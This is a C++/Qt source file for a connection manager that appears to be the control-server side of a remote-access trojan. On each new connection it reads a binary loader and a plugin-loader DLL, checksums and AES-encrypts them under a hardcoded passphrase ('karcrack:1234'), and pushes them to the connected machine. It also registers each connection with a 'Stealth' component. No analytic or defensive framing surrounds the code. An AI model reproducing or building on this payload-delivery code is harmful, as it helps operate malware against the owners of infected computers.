#include "connectionmanager.h"

ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;
    this->stealth=stealth;

    connect(this,SIGNAL(ConnectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    connect(this,SIGNAL(ConnectionEstablished(Connection*)),this->stealth,SLOT(addConnection(Connection*)));
}

void ConnectionManager::SetupConnection(Connection *connection)
{
    if(connection->getSetupState()==Connection::JustConnected)
    {
        /* Carga desde el resource
        QFile fileLoader(":/res/loader.bin");
        QFile filePluginLoader(":/res/pluginloader.dll");
        */

        /* Carga desde archivo */
        QFile fileLoader("loader.bin");
        QFile filePluginLoader("pluginloader.dll");

        if(!fileLoader.open(QIODevice::ReadOnly)) return;
        if(!filePluginLoader.open(QIODevice::ReadOnly)) return;

        QByteArray Loader=fileLoader.readAll();
        QByteArray PluginLoader=filePluginLoader.readAll();

        fileLoader.close();
        filePluginLoader.close();

        QByteArray TotalToSend;
        unsigned int datasize=Loader.size()+PluginLoader.size()+4;
        TotalToSend.append((char*)&datasize,4);
        TotalToSend.append(Loader);
        TotalToSend.append(PluginLoader);

        Crypto Crypt1(TotalToSend);
        QByteArray CheckSum=Crypt1.FNV1a(TotalToSend);

        TotalToSend.insert(0,CheckSum);
        Crypt1.setData(TotalToSend);
        QByteArray sha1=Crypt1.sha1(QString("karcrack:1234"));
        QByteArray iv=Crypt1.AES(sha1);

        TotalToSend.clear();
        TotalToSend.append(iv);
        TotalToSend.append(Crypt1.getData());

        connection->write(TotalToSend);
        connection->setIV(iv);

        connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
        connection->setState(Connection::Ready);
        connection->setSetupState(Connection::Finished);
    }
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}
